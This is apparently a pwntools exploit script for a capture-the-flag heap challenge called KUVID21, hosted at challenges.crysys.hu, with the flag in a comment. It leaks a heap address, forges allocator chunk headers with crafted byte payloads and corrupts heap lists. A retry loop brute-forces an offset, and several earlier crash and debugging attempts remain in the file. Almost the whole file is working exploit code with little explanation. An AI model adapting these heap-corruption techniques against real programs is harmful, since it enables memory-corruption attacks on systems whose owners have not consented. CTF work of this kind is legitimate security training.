from subprocess import Popen, PIPE
import sys
import random
import pwn
import time

pwn.context.log_level = 'error'

#cd21{m1t1g4t10ns_4r3_n0_us3_4g41nst_m3}

infectCount = 0
def infect(conn, first, last, allergies):
    global infectCount
    print(f'infecting: {infectCount}')
    infectCount+=1
    line = conn.recvuntil('Your choice:')
    conn.sendline(b'1')
    conn.recvuntil('Firstaddress:\n')
    conn.send(first)
    conn.recvuntil('Lastaddress:\n')
    conn.send(last)
    conn.recvuntil('Allergies:\n')
    conn.send(allergies)
    res = '\n'.join([line.decode('ascii') for line in conn.recvlines(4)])
    return res

def cure(conn, i):
    conn.recvuntil('Your choice:\n')
    conn.sendline(b'2')
    conn.recvuntil('Who to cure?\n')
    conn.sendline(str(i))

    res = conn.recvline().decode('ascii')
    print(f'cure {i}: {res}')
    if 'cd21{' in res:
        sys.exit()
       

    line = conn.recvuntil('Alright').decode('ascii')
    if 'This chunk is not infected with KUPAC virus. Thank the ALLOCATOR!' in line:
        print('cannot cure')

def crash(conn):
    k = 0
    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
    cure(conn, 0)
    r = infect(conn, b'aaaa', b'bbbb', f'12345678901234567 k={k} 23456789012345')
    
    conn.recvuntil('Your choice:\n')
    conn.sendline(b'2')
    conn.recvuntil('Who to cure?\n')
    conn.sendline(str(1))
    print(conn.recvall())


def reuse(i):
    global infectCount

    #conn = pwn.remote('challenges.crysys.hu', 5009)
    conn = pwn.process('./KUVID21')

    
    time.sleep(5 * 8 + 1)
    
    cure(conn, 0)
    cure(conn, 1)
    cure(conn, 2)
    cure(conn, 3)
    cure(conn, 4)
    cure(conn, 5)
    cure(conn, 6)
    cure(conn, 7)

    r = infect(conn, b'x', b'y', f'@')
    print(r)


def crash_when_overwrite(i):
    global infectCount

    #conn = pwn.remote('challenges.crysys.hu', 5009)
    #conn = pwn.process('./KUVID21')

    
    time.sleep(5*7 + 1)
    
    r = infect(conn, b'x', b'y', f'@')
    print(r)

    time.sleep(5 + 1)

    cure(conn, 7)
    r = infect(conn, b'x', b'y', f'@'*0x24)

    cure(conn, 0)
    cure(conn, 1)
    cure(conn, 2)
    cure(conn, 3)
    cure(conn, 4)
    cure(conn, 5)
    cure(conn, 6)

    cure(conn, 8)

def corrupted_double_linked_list(i):
    # global infectCount

    # #conn = pwn.remote('challenges.crysys.hu', 5009)
    # conn = pwn.process('./KUVID21')

    # time.sleep(5*7 + 1)
    
    # r = infect(conn, b'x', b'y', f'@')
    # print(r)

    # time.sleep(5 + 1)

    # cure(conn, 7)
    # r = infect(conn, b'\x00', b'w', f'e')


    # print(r)
    # r = r.split("\n")[0][8:(8+7*3-1)]
    # r = '59 55 55 55 05 00 00'
    # r = 'f9 c7 00 00 50 55 00'
    # r = '10 90 55 55 55 55 00'

    # next_lofasz = bytes([int(byte, 16) for byte in r.split(' ')])
    # print(next_lofasz)
    
    # cure(conn, 9)

   
   
    # payload =  (
    #     b"\x00\x00\x00\x00" +
    #     b"V4CCIN3\x00" +
    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    #     b"\x38\x00\x00\x00\x00\x00\x00\x00"
    # )

    # # payload =  (
    # #     b"V4CC" +
    # #     b"\x21\x00\x00\x00\x00\x00\x00\x00" +
    # #     #b"\x59\x55\x55\x05\x00\x00\x00\x00" +
    # #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    # #     b"\x10\x90\x55\x55\x55\x55\x00\x00" +
    # #     b"\x20\x00\x00\x00\x00\x00\x00\x00"
    # # )

    # assert len(payload) == 0x24

    # r = infect(conn, 
    #     b"\x39\x00\x00\x00\x00\x00\x00",
    #     # b"\x59\x55\x55\x05\x00\x00\x00", 
    #     b"\x10\x90\x55\x55\x55\x55\x00", 
    #     payload
    # )
    # print(r)

    # cure(conn, 0)
    # cure(conn, 1)
    # cure(conn, 2)
    # cure(conn, 3)
    # cure(conn, 4)
    # cure(conn, 5)
    # cure(conn, 6)

    # # cure(conn, 10)

    # #itt szall szet az 
    # # _int_free 0x7ffff7e7ecf0
    # # gdb -pid `ps -aux  | grep './KUVID21' | head -n 1 | cut -f6 -d$' '` 

    # print('curing 8')
    # conn.recvuntil('Your choice:\n')
    # conn.sendline(b'2')
    # print('>>> press enter')
    # input()
    # conn.recvuntil('Who to cure?\n')
    # conn.sendline(str(8))
    # print(conn.recvline())
    # print(conn.recvline())

    # r = infect(conn, b'x', b'y', f'IN3\x00')
    # print(r)
    pass



def free8big():
    global infectCount

    #conn = pwn.remote('challenges.crysys.hu', 5009)
    conn = pwn.process('./KUVID21')

    time.sleep(5*7+ 2)
    
    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
    print(r)

    time.sleep(5)

    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
    print(r)

    time.sleep(5)

    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
    print(r)

    time.sleep(5)


    cure(conn, 0)
    cure(conn, 1)
    cure(conn, 2)
    cure(conn, 3)
    cure(conn, 4)
    cure(conn, 5)
    cure(conn, 6)


    cure(conn, 10)

    cure(conn, 8)

    print("--------")
    print("enter to CONTINUE")
    input()

    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)
    # r = infect(conn, b'\x00', b'\x00', f'\x00')
    # print(r)

   

    print('>>> press [Enter] to quit')
    input()

def crash2():
    global infectCount

    #conn = pwn.remote('challenges.crysys.hu', 5009)
    conn = pwn.process('./KUVID21')

    time.sleep(5*7 + 1)
    
    r = infect(conn, b'x', b'y', f'@')
    print(r)

    time.sleep(5 + 1)

    cure(conn, 7)
    r = infect(conn, b'\x00', b'w', f'e')


    print(r)
    r = r.split("\n")[0][8:(8+7*3-1)]
    r = '59 55 55 55 05 00 00'
    r = 'f9 c7 00 00 50 55 00'
    r = '10 90 55 55 55 55 00'

    next_lofasz = bytes([int(byte, 16) for byte in r.split(' ')])
    print(next_lofasz)
    
    cure(conn, 9)

    # payload =  (
    #     b"V4CCIN3\x00" +
    #     b"\x00\x00\x00\x00" +
    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    #     b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    #     b"\x38\x00\x00\x00\x00\x00\x00\x00"
    # )

    payload =  (
        b"V4CC" +
        b"\x21\x00\x00\x00\x00\x00\x00\x00" +
        b"\xb0\x99\x55\x55\x55\x55\x00\x00" + 
        b"\xb0\x99\x55\x55\x55\x55\x00\x00" +
        b"\x20\x00\x00\x00\x00\x00\x00\x00"
    )

    assert len(payload) == 0x24

    r = infect(conn, 
        b"x",
        b"y", 
        payload
    )
    print(r)

    cure(conn, 0)
    cure(conn, 1)
    cure(conn, 2)
    cure(conn, 3)
    cure(conn, 4)
    cure(conn, 5)
    cure(conn, 6)

    # cure(conn, 10)

    #itt szall szet az 
    # _int_free 0x7ffff7e7ecf0
    # gdb -pid `ps -aux  | grep './KUVID21' | head -n 1 | cut -f6 -d$' '` 

    print('curing 8')
    conn.recvuntil('Your choice:\n')
    conn.sendline(b'2')
    print('>>> press enter')
    input()
    conn.recvuntil('Who to cure?\n')
    conn.sendline(str(8))
    print(conn.recvline())
    print(conn.recvline())

    r = infect(conn, b'x', b'y', f'IN3\x00')
    print(r)

  
def solve(to_be_guessed):
    global infectCount

    conn = pwn.remote('challenges.crysys.hu', 5009)
    #conn = pwn.process('./KUVID21')

    time.sleep(5*7)
    
    r = infect(conn, b'x'*7, b'w'*7, f'e' * 0x22)
    print(r)

    time.sleep(5)

    r = infect(conn, b'x'*7, b'w'*7, f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')
    print(r)

    time.sleep(5)

    r = infect(conn, b'x'*7, b'w'*7, f'e'*0x22)
    print(r)
    
    time.sleep(5)
    cure(conn, 0)
    cure(conn, 1)
    cure(conn, 2)
    cure(conn, 3)
    cure(conn, 4)
    cure(conn, 5)
    cure(conn, 6)


    cure(conn, 10)

    cure(conn, 8)

    cure(conn, 11)
    r = infect(conn, b'x'*7, b'w'*7, b'e'*(0x24 - 8) + b'\x60\x02\x00\x00\x00\x00\x00\x00')
    print(r)

    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = r.split("\n")[0][32:(32+7*3-1)]
    print(r)

    address_bytes = [int(byte, 16) for byte in r.split(' ')]

    address = int.from_bytes(address_bytes,'little') 
    address += to_be_guessed + 0x10

    address_bytes = address.to_bytes(8, 'little') 
    print(address_bytes) 

    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    
    
    r = infect(conn, 
        b'\x88\x88\x88\x88', 
        b'\x00', (
            b'\x00\x00\x00\x00' +
            b'\x61\x02\x00\x00\x00\x00\x00\x00' +
            address_bytes +
            address_bytes
            
        ))
    print(r)

    cure(conn, 12)

    print('heap corrupted')

    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
    r = infect(conn, b'\x00', b'\x00', f'1N3\x00')
    print(r)
  
    cure(conn, 26)
    sys.exit(0)



while True:
    try:
        to_be_guessed = random.choice([
            0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70,
            0x80, 0x90, 0xa0, 0xb0, 0xc0, 0xd0, 0xe0, 0xf0]
        )
        # to_be_guessed = 0x40
        print(f'------------ {hex(to_be_guessed)} ------------')
        solve(to_be_guessed)   
    except Exception:
        pass
